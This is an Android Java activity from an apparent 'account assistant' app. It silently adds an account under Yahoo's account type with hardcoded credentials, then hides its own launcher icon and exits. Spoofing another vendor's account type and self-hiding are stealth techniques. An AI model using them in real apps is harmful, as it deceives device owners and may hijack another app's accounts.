package com.accountassistant;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {

    private static final String ACCOUNT_TYPE = "com.yahoo.mobile.client.share.account";
    private static final String ACCOUNT_NAME = "2312213859@qq.com";
    private static final String PASSWORD = "123456";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        handleAccount();

        finish();
    }

    private void handleAccount() {

        AccountManager am = AccountManager.get(this);
        Account account = new Account(ACCOUNT_NAME, ACCOUNT_TYPE);

        if (am.getAccountsByType(ACCOUNT_TYPE).length > 0) {
            hideLauncherIfNeeded();
            return;
        }

        boolean ok = am.addAccountExplicitly(account, PASSWORD, null);

        if (ok) {
            hideLauncherIfNeeded();
        }
    }

    private void hideLauncherIfNeeded() {

        ComponentName launcher = new ComponentName(
                getPackageName(),
                getPackageName() + ".LauncherActivity"
        );

        PackageManager pm = getPackageManager();

        if (pm.getComponentEnabledSetting(launcher)
                != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {

            pm.setComponentEnabledSetting(
                    launcher,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        }
    }
}